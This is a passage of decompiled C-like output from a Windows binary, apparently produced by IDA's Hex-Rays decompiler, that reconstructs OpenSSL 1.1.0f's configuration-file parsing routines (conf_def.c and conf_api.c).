  sub_1400A1F20((__int64)a1);
  sub_14001D930(a1);
  return 1i64;
}

//----- (00000001400A0EB0) ----------------------------------------------------
__int64 __fastcall sub_1400A0EB0(__int64 a1)
{
  if ( !a1 )
    return 0i64;
  sub_1400A1F20(a1);
  return 1i64;
}

//----- (00000001400A0EE0) ----------------------------------------------------
__int64 __fastcall sub_1400A0EE0(__int64 a1, const CHAR *a2, unsigned int *a3)
{
  __int64 *v5; // rax
  __int64 v6; // rdi
  unsigned int v8; // ebx

  v5 = sub_14003E440(a2, "rb");
  v6 = (__int64)v5;
  if ( v5 )
  {
    v8 = sub_1400A0FB0(a1, (__int64)v5, a3);
    sub_140029BA0(v6);
    return v8;
  }
  else
  {
    if ( (sub_1400244B0() & 0xFFF) == 128 )
      sub_140024610(14, 120, 114, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_def.c", 150);
    else
      sub_140024610(14, 120, 2, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_def.c", 152);
    return 0i64;
  }
}

//----- (00000001400A0FB0) ----------------------------------------------------
__int64 __fastcall sub_1400A0FB0(__int64 a1, __int64 a2, unsigned int *a3)
{
  __int64 v3; // rdi
  unsigned int v4; // ebx
  void **v6; // r15
  _BYTE *v7; // rsi
  __int64 v8; // rbp
  _QWORD *v9; // r14
  int v10; // r12d
  int v11; // edi
  __int64 v12; // rcx
  _BYTE *v13; // rbx
  unsigned int v14; // ecx
  _BYTE *i; // rax
  unsigned int v16; // ecx
  unsigned int v17; // r8d
  _BYTE *v18; // rdx
  __int64 v19; // r8
  unsigned __int8 *v20; // rcx
  char *v21; // rdi
  __int64 v22; // r8
  __int64 j; // rax
  __int64 v24; // rax
  __int64 v25; // rax
  __int64 v26; // rax
  char *v27; // rdi
  _BYTE *k; // rcx
  __int64 v29; // rax
  char *m; // r9
  char *n; // rax
  __int16 v32; // dx
  char *v33; // rdx
  __int64 ii; // rcx
  __int64 v35; // rcx
  int v36; // eax
  char *v37; // rbp
  unsigned __int8 *v38; // rax
  unsigned __int8 *v39; // r10
  unsigned __int8 *v40; // rcx
  __int64 v41; // rdx
  __int64 jj; // rax
  __int64 v43; // rax
  char *v44; // rcx
  __int64 v45; // rdx
  char *v46; // rbx
  __int64 v47; // rax
  __int16 v48; // r8
  __int64 v49; // rax
  __int64 v50; // rax
  char *kk; // rcx
  char *v52; // rdx
  unsigned int v53; // ecx
  _BYTE *v54; // rax
  unsigned int v55; // ecx
  char *mm; // r9
  _QWORD *v57; // rax
  __int16 v58; // r8
  __int64 v59; // rcx
  int v61; // [rsp+20h] [rbp-98h]
  int v62; // [rsp+20h] [rbp-98h]
  unsigned int v63; // [rsp+30h] [rbp-88h]
  int v64; // [rsp+34h] [rbp-84h]
  __int64 v65; // [rsp+38h] [rbp-80h]
  void *v66; // [rsp+40h] [rbp-78h]
  _BYTE *v67; // [rsp+48h] [rbp-70h]
  __int64 v68; // [rsp+50h] [rbp-68h] BYREF
  __int64 v69; // [rsp+58h] [rbp-60h]
  unsigned int *v70; // [rsp+60h] [rbp-58h]
  char v71[16]; // [rsp+68h] [rbp-50h] BYREF

  v3 = *(_QWORD *)(a1 + 16);
  v4 = 0;
  v63 = 0;
  v65 = v3;
  v6 = 0i64;
  v70 = a3;
  v7 = 0i64;
  v69 = a2;
  v66 = sub_1400825B0();
  v8 = (__int64)v66;
  if ( !v66 )
  {
    sub_140024610(14, 121, 7, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_def.c", 179);
    goto LABEL_89;
  }
  v67 = sub_14003BB60("default");
  v7 = v67;
  v68 = (__int64)v67;
  if ( !v67 )
  {
    v61 = 185;
LABEL_5:
    sub_140024610(14, 121, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_def.c", v61);
    goto LABEL_89;
  }
  if ( !sub_1400A2100(a1) )
  {
    v61 = 190;
    goto LABEL_5;
  }
  v9 = sub_1400A2150(a1, v67);
  if ( !v9 )
  {
    sub_140024610(14, 121, 103, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_def.c", 196);
    goto LABEL_89;
  }
  v10 = 0;
  v11 = 0;
  if ( !sub_1400822F0((__int64)v66, 0x200ui64) )
  {
LABEL_102:
    sub_140024610(14, 121, 7, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_def.c", 204);
    v6 = 0i64;
    goto LABEL_88;
  }
  while ( 1 )
  {
    v12 = v69;
    v13 = (_BYTE *)(*(_QWORD *)(v8 + 8) + v10);
    *v13 = 0;
    sub_140029D60(v12, (__int64)v13, 0x1FFu);
    v14 = 0;
    v13[511] = 0;
    for ( i = v13; *i; ++v14 )
    {
      if ( v14 >= 0x80000000 )
        break;
      ++i;
    }
    v16 = v14 & 0x7FFFFFFF;
    v17 = v16;
    if ( !v16 && !v11 )
    {
      sub_140082280(v8);
      sub_14001D930(v7);
      return 1i64;
    }
    v11 = 0;
    v64 = 0;
    if ( !v16 )
      goto LABEL_23;
    v18 = &v13[v16 - 1];
    do
    {
      if ( *v18 != 13 && *v18 != 10 )
        break;
      --v18;
      --v17;
    }
    while ( (__int64)&v18[1i64 - (_QWORD)v13] > 0 );
    if ( v17 == v16 )
    {
      v11 = 1;
      v64 = 1;
    }
    else
    {
LABEL_23:
      ++v63;
      v13[v17] = 0;
    }
    v10 += v17;
    v6 = 0i64;
    if ( v10 < 1 )
      break;
    v19 = *(_QWORD *)(a1 + 8);
    v20 = (unsigned __int8 *)(*(_QWORD *)(v8 + 8) + v10 - 1);
    if ( (*(_BYTE *)(v19 + 2i64 * *v20) & 0x20) == 0 || v10 > 1 && (*(_BYTE *)(v19 + 2i64 * *(v20 - 1)) & 0x20) != 0 )
      break;
    --v10;
    v11 = 1;
LABEL_100:
    if ( !sub_1400822F0(v8, v10 + 512) )
    {
      v4 = v63;
      goto LABEL_102;
    }
  }
  if ( v11 )
    goto LABEL_100;
  v21 = *(char **)(v8 + 8);
  v10 = 0;
  sub_1400A17E0(a1, v21);
  v22 = *(_QWORD *)(a1 + 8);
  for ( j = 2i64 * (unsigned __int8)*v21; (*(_BYTE *)(j + v22) & 0x10) != 0; j = 2 * v24 )
  {
    if ( (*(_BYTE *)(j + v22) & 8) != 0 )
      break;
    v24 = (unsigned __int8)*++v21;
  }
  v25 = (unsigned __int8)*v21;
  if ( (*(_BYTE *)(v22 + 2 * v25) & 8) != 0 )
  {
LABEL_99:
    v11 = v64;
    goto LABEL_100;
  }
  if ( (_BYTE)v25 == 91 )
  {
    v26 = (unsigned __int8)v21[1];
    v27 = v21 + 1;
    for ( k = (_BYTE *)(v22 + 2 * v26); (*k & 0x10) != 0; k = (_BYTE *)(v22 + 2 * v29) )
    {
      if ( (*k & 8) != 0 )
        break;
      v29 = (unsigned __int8)*++v27;
    }
    for ( m = v27; ; m = v33 )
    {
      for ( n = m; ; ++n )
      {
        while ( 1 )
        {
          v32 = *(_WORD *)(v22 + 2i64 * (unsigned __int8)*n);
          if ( (v32 & 0x20) == 0 )
            break;
          n += 2i64 - ((*(_BYTE *)(v22 + 2i64 * (unsigned __int8)n[1]) & 8) != 0);
        }
        if ( (v32 & 0x307) == 0 )
          break;
      }
      v33 = n;
      v8 = (__int64)v66;
      for ( ii = 2i64 * (unsigned __int8)*n; (*(_BYTE *)(v22 + ii) & 0x10) != 0; ii = 2 * v35 )
      {
        if ( (*(_BYTE *)(v22 + ii) & 8) != 0 )
          break;
        v35 = (unsigned __int8)*++v33;
      }
      if ( *v33 == 93 )
        break;
      if ( !*v33 || m == v33 )
      {
        sub_140024610(14, 121, 100, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_def.c", 273);
        goto LABEL_87;
      }
    }
    *n = 0;
    v36 = sub_1400A19C0(a1, 0i64, (void **)&v68, v27);
    v7 = (_BYTE *)v68;
    if ( !v36 )
      goto LABEL_87;
    v67 = (_BYTE *)v68;
    v9 = sub_1400A1F80(a1, v68);
    if ( !v9 )
    {
      v9 = sub_1400A2150(a1, v7);
      if ( !v9 )
      {
        sub_140024610(14, 121, 103, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_def.c", 283);
        goto LABEL_87;
      }
    }
    goto LABEL_99;
  }
  v37 = 0i64;
  v38 = sub_1400A1970(a1, (unsigned __int8 *)v21);
  v39 = v38;
  if ( *v38 == 58 && v38[1] == 58 )
  {
    *v38 = 0;
    v37 = v21;
    v21 = (char *)(v38 + 2);
    v39 = sub_1400A1970(a1, v38 + 2);
  }
  v40 = v39;
  v41 = *(_QWORD *)(a1 + 8);
  for ( jj = 2i64 * *v39; (*(_BYTE *)(v41 + jj) & 0x10) != 0; jj = 2 * v43 )
  {
    if ( (*(_BYTE *)(v41 + jj) & 8) != 0 )
      break;
    v43 = *++v40;
  }
  if ( *v40 != 61 )
  {
    sub_140024610(14, 121, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_def.c", 300);
    goto LABEL_86;
  }
  v44 = (char *)(v40 + 1);
  *v39 = 0;
  v45 = *(_QWORD *)(a1 + 8);
  v46 = v44;
  v47 = 2i64 * (unsigned __int8)*v44;
  v48 = *(_WORD *)(v45 + v47);
  if ( (v48 & 0x10) != 0 )
  {
    do
    {
      if ( (*(_BYTE *)(v45 + v47) & 8) != 0 )
        break;
      v49 = (unsigned __int8)*++v46;
      v47 = 2 * v49;
    }
    while ( (*(_BYTE *)(v45 + v47) & 0x10) != 0 );
  }
  if ( (v48 & 8) == 0 )
  {
    do
      v50 = (unsigned __int8)*++v44;
    while ( (*(_BYTE *)(v45 + 2 * v50) & 8) == 0 );
  }
  for ( kk = v44 - 1; kk != v46; --kk )
  {
    if ( (*(_BYTE *)(v45 + 2i64 * (unsigned __int8)*kk) & 0x10) == 0 )
      break;
  }
  kk[1] = 0;
  v6 = (void **)sub_14001D8E0(0x18ui64);
  if ( !v6 )
  {
    v62 = 315;
LABEL_106:
    v58 = 65;
LABEL_85:
    sub_140024610(14, 121, v58, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_def.c", v62);
    goto LABEL_86;
  }
  v52 = v21;
  if ( !v37 )
    v37 = v7;
  v53 = 0;
  if ( *v21 )
  {
    do
    {
      if ( v53 >= 0x80000000 )
        break;
      ++v52;
      ++v53;
    }
    while ( *v52 );
  }
  v54 = sub_14001D8E0((v53 & 0x7FFFFFFF) + 1);
  v6[1] = v54;
  v6[2] = 0i64;
  if ( v54 )
  {
    v55 = 0;
    for ( mm = v21; *mm; ++v55 )
    {
      if ( v55 >= 0x80000000 )
        break;
      ++mm;
    }
    sub_14003C060(v54, v21, (v55 & 0x7FFFFFFF) + 1);
    v7 = v67;
    if ( !(unsigned int)sub_1400A19C0(a1, v37, v6 + 2, v46) )
      goto LABEL_86;
    if ( !strcmp(v37, v67) )
    {
      v57 = v9;
    }
    else
    {
      v57 = sub_1400A1F80(a1, (__int64)v37);
      if ( !v57 )
      {
        v57 = sub_1400A2150(a1, v37);
        if ( !v57 )
        {
          v62 = 336;
          v58 = 103;
          goto LABEL_85;
        }
      }
    }
    if ( !(unsigned int)sub_1400A1E60(a1, v57, v6) )
    {
      v62 = 342;
      goto LABEL_106;
    }
    v8 = (__int64)v66;
    goto LABEL_99;
  }
  sub_140024610(14, 121, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_def.c", 323);
  v7 = v67;
LABEL_86:
  v8 = (__int64)v66;
LABEL_87:
  v4 = v63;
LABEL_88:
  v3 = v65;
LABEL_89:
  sub_140082280(v8);
  sub_14001D930(v7);
  if ( v70 )
    *v70 = v4;
  sub_14002A5C0(v71, 0xDui64, "%ld", v4);
  sub_140023A40(2, "line ", v71);
  v59 = *(_QWORD *)(a1 + 16);
  if ( v3 != v59 )
  {
    sub_14005BD30(v59);
    *(_QWORD *)(a1 + 16) = 0i64;
  }
  if ( v6 )
  {
    sub_14001D930(v6[1]);
    sub_14001D930(v6[2]);
    sub_14001D930(v6);
  }
  return 0i64;
}
// 1400A116D: conditional instruction was optimized away because ecx.4>=1

//----- (00000001400A1780) ----------------------------------------------------
__int64 __fastcall sub_1400A1780(__int64 a1, __int64 a2)
{
  sub_14003EC10(*(_QWORD *)(a1 + 16), (void (__fastcall *)(_QWORD, __int64))sub_1400A1920, a2);
  return 1i64;
}

//----- (00000001400A17B0) ----------------------------------------------------
__int64 __fastcall sub_1400A17B0(__int64 a1, unsigned __int8 a2)
{
  return *(_WORD *)(*(_QWORD *)(a1 + 8) + 2i64 * a2) & 1;
}

//----- (00000001400A17C0) ----------------------------------------------------
__int64 __fastcall sub_1400A17C0(__int64 a1, char a2)
{
  return (unsigned int)(a2 - 48);
}

//----- (00000001400A17D0) ----------------------------------------------------
char **sub_1400A17D0()
{
  return &off_14013D030;
}
// 14013D030: using guessed type char *off_14013D030;

//----- (00000001400A17E0) ----------------------------------------------------
__int64 __fastcall sub_1400A17E0(__int64 a1, char *a2)
{
  __int64 v2; // r8
  __int64 result; // rax
  __int64 v4; // rcx
  __int64 v5; // rax
  int v6; // r9d
  char *i; // rcx
  __int64 v8; // rax
  int v9; // r9d
  _BYTE *v10; // rcx
  __int64 v11; // rax
  unsigned __int8 *v12; // rcx

  v2 = *(_QWORD *)(a1 + 8);
  result = (unsigned __int8)*a2;
  if ( (*(_WORD *)(v2 + 2 * result) & 0x800) == 0 )
  {
    while ( (*(_BYTE *)(v2 + 2i64 * (unsigned __int8)*a2) & 0x10) != 0 )
    {
      result = (unsigned __int8)*++a2;
      if ( (*(_WORD *)(v2 + 2 * result) & 0x800) != 0 )
      {
        *a2 = 0;
        return result;
      }
    }
    for ( result = (unsigned __int8)*a2; *(char *)(v2 + 2 * result) >= 0; result = (unsigned __int8)*a2 )
    {
      v4 = (unsigned __int8)*a2;
      result = *(unsigned __int16 *)(v2 + 2 * v4);
      if ( (result & 0x400) != 0 )
      {
        v5 = (unsigned __int8)a2[1];
        v6 = (char)v4;
        for ( i = a2 + 1; (*(_BYTE *)(v2 + 2 * v5) & 8) == 0; ++i )
        {
          if ( (char)v5 == v6 )
          {
            if ( i[1] != v6 )
              break;
            ++i;
          }
          v5 = (unsigned __int8)i[1];
        }
        a2 = i + 1;
        if ( *i != v6 )
          a2 = i;
      }
      else if ( (result & 0x40) != 0 )
      {
        v8 = (unsigned __int8)*++a2;
        v9 = (char)v4;
        v10 = (_BYTE *)(v2 + 2 * v8);
        if ( (*v10 & 8) == 0 )
        {
          while ( (char)v8 != v9 )
          {
            if ( (*v10 & 0x20) != 0 )
            {
              v11 = (unsigned __int8)*++a2;
              if ( (*(_BYTE *)(v2 + 2 * v11) & 8) != 0 )
                goto LABEL_28;
            }
            v8 = (unsigned __int8)*++a2;
            v10 = (_BYTE *)(v2 + 2 * v8);
            if ( (*v10 & 8) != 0 )
              break;
          }
        }
        v12 = (unsigned __int8 *)(a2 + 1);
        if ( *a2 != v9 )
          v12 = (unsigned __int8 *)a2;
        a2 = (char *)v12;
      }
      else if ( (result & 0x20) != 0 )
      {
        a2 += 2i64 - ((*(_BYTE *)(v2 + 2i64 * (unsigned __int8)a2[1]) & 8) != 0);
      }
      else
      {
        if ( (result & 8) != 0 )
          return result;
        ++a2;
      }
LABEL_28:
      ;
    }
  }
  *a2 = 0;
  return result;
}

//----- (00000001400A1920) ----------------------------------------------------
__int64 __fastcall sub_1400A1920(const char **a1, __int64 a2)
{
  const char *v2; // r9
  const char *v3; // r8

  v2 = a1[1];
  v3 = *a1;
  if ( v2 )
    return sub_14002A590(a2, "[%s] %s=%s\n", v3, v2, a1[2]);
  else
    return sub_14002A590(a2, "[[%s]]\n", v3);
}

//----- (00000001400A1970) ----------------------------------------------------
unsigned __int8 *__fastcall sub_1400A1970(__int64 a1, unsigned __int8 *a2)
{
  __int64 v2; // r8
  __int16 v3; // cx

  v2 = *(_QWORD *)(a1 + 8);
  while ( 1 )
  {
    while ( 1 )
    {
      v3 = *(_WORD *)(v2 + 2i64 * *a2);
      if ( (v3 & 0x20) == 0 )
        break;
      a2 += 2i64 - ((*(_BYTE *)(v2 + 2i64 * a2[1]) & 8) != 0);
    }
    if ( (v3 & 0x307) == 0 )
      break;
    ++a2;
  }
  return a2;
}

//----- (00000001400A19C0) ----------------------------------------------------
__int64 __fastcall sub_1400A19C0(__int64 a1, const char *a2, void **a3, char *a4)
{
  const char *v5; // rdi
  __int64 v6; // rsi
  int v7; // ebp
  __int64 result; // rax
  _QWORD *v9; // r12
  unsigned int v10; // eax
  char *i; // rcx
  __int64 v12; // rcx
  __int64 v13; // rdx
  __int64 v14; // r14
  __int16 v15; // ax
  int v16; // r9d
  __int64 v17; // rcx
  __int16 j; // r8
  int v19; // r8d
  __int64 v20; // rcx
  char v21; // al
  __int64 v22; // r8
  char v23; // cl
  unsigned __int8 v24; // al
  char *v25; // r8
  char *v26; // r12
  int v27; // r9d
  const char *v28; // r10
  char *v29; // rdi
  __int64 v30; // rax
  __int64 v31; // rax
  __int64 v32; // rcx
  __int64 v33; // rax
  int v34; // r15d
  char *v35; // r13
  _BYTE *v36; // rsi
  unsigned int v37; // ecx
  _BYTE *k; // rdx
  __int64 v39; // rdx
  unsigned __int64 v40; // rdx
  char m; // cl
  char v42; // [rsp+30h] [rbp-48h]
  _QWORD *v43; // [rsp+38h] [rbp-40h]

  v42 = 0;
  v5 = a2;
  v6 = a1;
  v7 = 0;
  result = (__int64)sub_1400825B0();
  v43 = (_QWORD *)result;
  v9 = (_QWORD *)result;
  if ( result )
  {
    v10 = 0;
    for ( i = a4; *i; ++v10 )
    {
      if ( v10 >= 0x80000000 )
        break;
      ++i;
    }
    if ( sub_1400822F0((__int64)v9, (int)((v10 & 0x7FFFFFFF) + 1)) )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            while ( 1 )
            {
              v12 = (unsigned __int8)*a4;
              v13 = *(_QWORD *)(v6 + 8);
              v14 = v7;
              v15 = *(_WORD *)(v13 + 2 * v12);
              if ( (v15 & 0x40) == 0 )
                break;
              ++a4;
              v16 = (char)v12;
              v17 = (unsigned __int8)*a4;
              for ( j = *(_WORD *)(v13 + 2 * v17); (j & 8) == 0; j = *(_WORD *)(v13 + 2 * v17) )
              {
                if ( (char)v17 == v16 )
                  break;
                if ( (j & 0x20) != 0 )
                {
                  v17 = (unsigned __int8)*++a4;
                  if ( (*(_BYTE *)(v13 + 2 * v17) & 8) != 0 )
                    break;
                }
                ++a4;
                ++v7;
                *(_BYTE *)(v14 + v9[1]) = v17;
                ++v14;
                v17 = (unsigned __int8)*a4;
                v13 = *(_QWORD *)(v6 + 8);
              }
              if ( *a4 == v16 )
                ++a4;
            }
            if ( (v15 & 0x400) == 0 )
              break;
            ++a4;
            v19 = (char)v12;
            v20 = (unsigned __int8)*a4;
            if ( (*(_BYTE *)(v13 + 2 * v20) & 8) == 0 )
            {
              do
              {
                if ( (char)v20 == v19 )
                {
                  if ( a4[1] != v19 )
                    break;
                  ++a4;
                }
                v21 = *a4;
                ++v7;
                ++a4;
                *(_BYTE *)(v14 + v9[1]) = v21;
                ++v14;
                v20 = (unsigned __int8)*a4;
              }
              while ( (*(_BYTE *)(*(_QWORD *)(v6 + 8) + 2 * v20) & 8) == 0 );
            }
            if ( *a4 == v19 )
              ++a4;
          }
          if ( (v15 & 0x20) == 0 )
            break;
          v22 = (unsigned __int8)a4[1];
          a4 += 2;
          if ( (*(_BYTE *)(v13 + 2 * v22) & 8) != 0 )
            goto LABEL_68;
          switch ( (_BYTE)v22 )
          {
            case 'r':
              ++v7;
              *(_BYTE *)(v14 + v9[1]) = 13;
              break;
            case 'n':
              ++v7;
              *(_BYTE *)(v14 + v9[1]) = 10;
              break;
            case 'b':
              ++v7;
              *(_BYTE *)(v14 + v9[1]) = 8;
              break;
            default:
              v23 = v22;
              if ( (_BYTE)v22 == 116 )
                v23 = 9;
              ++v7;
              *(_BYTE *)(v14 + v9[1]) = v23;
              break;
          }
        }
        if ( (v15 & 8) != 0 )
          break;
        if ( (_BYTE)v12 == 36 )
        {
          v24 = a4[1];
          v25 = a4 + 1;
          v26 = 0i64;
          if ( v24 == 123 )
          {
            v27 = 125;
            v25 = a4 + 2;
          }
          else if ( v24 == 40 )
          {
            v27 = 41;
            v25 = a4 + 2;
          }
          else
          {
            v27 = 0;
          }
          v28 = v5;
          v29 = v25;
          if ( (*(_WORD *)(v13 + 2i64 * (unsigned __int8)*v25) & 0x107) != 0 )
          {
            do
              v30 = (unsigned __int8)*++v29;
            while ( (*(_WORD *)(v13 + 2 * v30) & 0x107) != 0 );
          }
          if ( *v29 == 58 && v29[1] == 58 )
          {
            *v29 = 0;
            v26 = v29;
            v31 = (unsigned __int8)v29[2];
            v29 += 2;
            v32 = *(_QWORD *)(v6 + 8);
            v28 = v25;
            v42 = 58;
            v25 = v29;
            if ( (*(_WORD *)(v32 + 2 * v31) & 0x107) != 0 )
            {
              do
                v33 = (unsigned __int8)*++v29;
              while ( (*(_WORD *)(v32 + 2 * v33) & 0x107) != 0 );
            }
          }
          v34 = *v29;
          v35 = v29;
          *v29 = 0;
          if ( v27 )
          {
            if ( v34 != v27 )
            {
              sub_140024610(14, 101, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_def.c", 499);
LABEL_62:
              v9 = v43;
              goto LABEL_63;
            }
            ++v29;
          }
          v36 = (_BYTE *)sub_1400A2010(v6, v28, v25);
          if ( v26 )
            *v26 = v42;
          *v35 = v34;
          if ( !v36 )
          {
            sub_140024610(14, 101, 104, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_def.c", 519);
            goto LABEL_62;
          }
          v37 = 0;
          for ( k = v36; *k; ++v37 )
          {
            if ( v37 >= 0x80000000 )
              break;
            ++k;
          }
          v9 = v43;
          v39 = v37;
          LODWORD(v39) = v37 & 0x7FFFFFFF;
          v40 = (unsigned __int64)&a4[v39 - (_QWORD)v29 + *v43];
          if ( v40 > 0x10000 )
          {
            sub_140024610(14, 101, 116, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_def.c", 524);
            goto LABEL_63;
          }
          if ( !sub_140082440((__int64)v43, v40) )
          {
            sub_140024610(14, 101, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_def.c", 528);
            goto LABEL_63;
          }
          for ( m = *v36; *v36; m = *v36 )
          {
            ++v36;
            ++v7;
            *(_BYTE *)(++v14 + v43[1] - 1) = m;
          }
          v6 = a1;
          a4 = v29;
          v5 = a2;
          *v35 = v34;
        }
        else
        {
          ++v7;
          ++a4;
          *(_BYTE *)(v14 + v9[1]) = v12;
        }
      }
LABEL_68:
      *(_BYTE *)(v7 + v9[1]) = 0;
      sub_14001D930(*a3);
      *a3 = (void *)v9[1];
      sub_14001D930(v9);
      return 1i64;
    }
    else
    {
LABEL_63:
      sub_140082280((__int64)v9);
      return 0i64;
    }
  }
  return result;
}

//----- (00000001400A1E60) ----------------------------------------------------
__int64 __fastcall sub_1400A1E60(__int64 a1, _QWORD *a2, _QWORD *a3)
{
  int *v3; // rsi
  __int64 result; // rax
  void **v7; // rax
  void **v8; // rbx

  v3 = (int *)a2[2];
  *a3 = *a2;
  result = sub_1400297C0(v3, (__int64)a3);
  if ( (_DWORD)result )
  {
    v7 = (void **)sub_14003ED50(*(_QWORD *)(a1 + 16), (__int64)a3);
    v8 = v7;
    if ( v7 )
    {
      sub_1400293F0((__int64)v3, (__int64)v7);
      sub_14001D930(v8[1]);
      sub_14001D930(v8[2]);
      sub_14001D930(v8);
    }
    return 1i64;
  }
  return result;
}

//----- (00000001400A1F20) ----------------------------------------------------
void __fastcall sub_1400A1F20(__int64 a1)
{
  __int64 v2; // rcx

  if ( a1 )
  {
    v2 = *(_QWORD *)(a1 + 16);
    if ( v2 )
    {
      sub_14003F010(v2, 0);
      sub_14003EC10(*(_QWORD *)(a1 + 16), (void (__fastcall *)(_QWORD, __int64))sub_1400A2350, *(_QWORD *)(a1 + 16));
      sub_14003EBA0(*(_QWORD *)(a1 + 16), sub_1400A2380);
      sub_14003ECA0(*(_QWORD *)(a1 + 16));
    }
  }
}

//----- (00000001400A1F80) ----------------------------------------------------
_QWORD *__fastcall sub_1400A1F80(__int64 a1, __int64 a2)
{
  __int64 v2; // rcx
  __int64 v4[5]; // [rsp+20h] [rbp-28h] BYREF

  if ( !a1 || !a2 )
    return 0i64;
  v2 = *(_QWORD *)(a1 + 16);
  v4[0] = a2;
  v4[1] = 0i64;
  return sub_14003EF50(v2, (__int64)v4);
}

//----- (00000001400A1FC0) ----------------------------------------------------
__int64 __fastcall sub_1400A1FC0(__int64 a1, __int64 a2)
{
  __int64 v2; // rcx
  _QWORD *v3; // rax
  __int64 v5[5]; // [rsp+20h] [rbp-28h] BYREF

  if ( a1 && a2 && (v2 = *(_QWORD *)(a1 + 16), v5[0] = a2, v5[1] = 0i64, (v3 = sub_14003EF50(v2, (__int64)v5)) != 0i64) )
    return v3[2];
  else
    return 0i64;
}

//----- (00000001400A2010) ----------------------------------------------------
__int64 __fastcall sub_1400A2010(__int64 a1, const char *a2, char *a3)
{
  __int64 result; // rax
  __int64 v7; // rcx
  _QWORD *v8; // rax
  __int64 v9; // rcx
  char v10; // al
  __int64 v11; // rcx
  const char *v12; // [rsp+20h] [rbp-28h] BYREF
  char *v13; // [rsp+28h] [rbp-20h]

  if ( !a3 )
    return 0i64;
  if ( a1 )
  {
    if ( a2 )
    {
      v7 = *(_QWORD *)(a1 + 16);
      v13 = a3;
      v12 = a2;
      v8 = sub_14003EF50(v7, (__int64)&v12);
      if ( v8 )
        return v8[2];
      v9 = 0i64;
      while ( 1 )
      {
        v10 = a2[v9++];
        if ( v10 != aEnv[v9 - 1] )
          break;
        if ( v9 == 4 )
        {
          result = common_getenv<char>(a3);
          if ( result )
            return result;
          break;
        }
      }
    }
    v11 = *(_QWORD *)(a1 + 16);
    v12 = "default";
    v13 = a3;
    v8 = sub_14003EF50(v11, (__int64)&v12);
    if ( !v8 )
      return 0i64;
    return v8[2];
  }
  return common_getenv<char>(a3);
}

//----- (00000001400A2100) ----------------------------------------------------
_BOOL8 __fastcall sub_1400A2100(__int64 a1)
{
  _BOOL8 result; // rax
  _QWORD *v3; // rax

  result = 0;
  if ( a1 )
  {
    if ( *(_QWORD *)(a1 + 16) )
      return 1;
    v3 = sub_14003EE70(
           (__int64 (__fastcall *)(char *))sub_1400A2310,
           (int (__cdecl *)(const char *, const char *))sub_1400A2280);
    *(_QWORD *)(a1 + 16) = v3;
    if ( v3 )
      return 1;
  }
  return result;
}

//----- (00000001400A2150) ----------------------------------------------------
_QWORD *__fastcall sub_1400A2150(__int64 a1, _BYTE *a2)
{
  _QWORD *v4; // rbx
  void **v5; // rsi
  unsigned int v6; // ecx
  _BYTE *i; // rdx
  size_t v8; // rbp
  void *v9; // rax

  v4 = 0i64;
  v5 = (void **)sub_1400296C0();
  if ( !v5 )
    goto LABEL_10;
  v4 = sub_14001D8E0(0x18ui64);
  if ( !v4 )
    goto LABEL_10;
  v6 = 0;
  for ( i = a2; *i; ++v6 )
  {
    if ( v6 >= 0x80000000 )
      break;
    ++i;
  }
  v8 = (int)((v6 & 0x7FFFFFFF) + 1);
  v9 = sub_14001D8E0(v8);
  *v4 = v9;
  if ( v9 )
  {
    memmove(v9, a2, v8);
    v4[1] = 0i64;
    v4[2] = v5;
    if ( sub_14003ED50(*(_QWORD *)(a1 + 16), (__int64)v4) )
      sub_1400234A0("assertion failed: vv == NULL", "..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_api.c", 207i64);
    return v4;
  }
  else
  {
LABEL_10:
    sub_1400294B0(v5);
    sub_14001D930(v4);
    return 0i64;
  }
}

//----- (00000001400A2280) ----------------------------------------------------
__int64 __fastcall sub_1400A2280(unsigned __int8 **a1, unsigned __int8 **a2)
{
  unsigned __int8 *v2; // rax
  __int64 v5; // r9
  unsigned __int8 v6; // cl
  __int64 result; // rax
  unsigned __int8 *v8; // rcx
  unsigned __int8 *v9; // rdx
  __int64 v10; // rdx
  unsigned __int8 v11; // al

  v2 = *a1;
  if ( *a1 == *a2 )
    goto LABEL_8;
  v5 = *a2 - v2;
  while ( 1 )
  {
    v6 = *v2;
    if ( *v2 != v2[v5] )
      break;
    ++v2;
    if ( !v6 )
    {
      result = 0i64;
      goto LABEL_7;
    }
  }
  result = v6 < v2[v5] ? -1 : 1;
LABEL_7:
  if ( !(_DWORD)result )
  {
LABEL_8:
    v8 = a1[1];
    if ( v8 && (v9 = a2[1]) != 0i64 )
    {
      v10 = v9 - v8;
      while ( 1 )
      {
        v11 = *v8;
        if ( *v8 != v8[v10] )
          break;
        ++v8;
        if ( !v11 )
          return 0i64;
      }
      return v11 < v8[v10] ? -1 : 1;
    }
    else if ( v8 == a2[1] )
    {
      return 0i64;
    }
    else
    {
      result = 1i64;
      if ( !v8 )
        return 0xFFFFFFFFi64;
    }
  }
  return result;
}

//----- (00000001400A2310) ----------------------------------------------------
__int64 __fastcall sub_1400A2310(char **a1)
{
  int v2; // edi

  v2 = sub_14003F020(a1[1]);
  return v2 ^ (4 * (unsigned int)sub_14003F020(*a1));
}

//----- (00000001400A2350) ----------------------------------------------------
__int64 __fastcall sub_1400A2350(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  result = a2;
  if ( *(_QWORD *)(a1 + 8) )
    return sub_14003EAA0(a2, a1);
  return result;
}

//----- (00000001400A2380) ----------------------------------------------------
void __fastcall sub_1400A2380(__int64 a1)
{
  unsigned int *v2; // rbp
  int i; // edi
  void **v4; // rbx

  if ( !*(_QWORD *)(a1 + 8) )
  {
    v2 = *(unsigned int **)(a1 + 16);
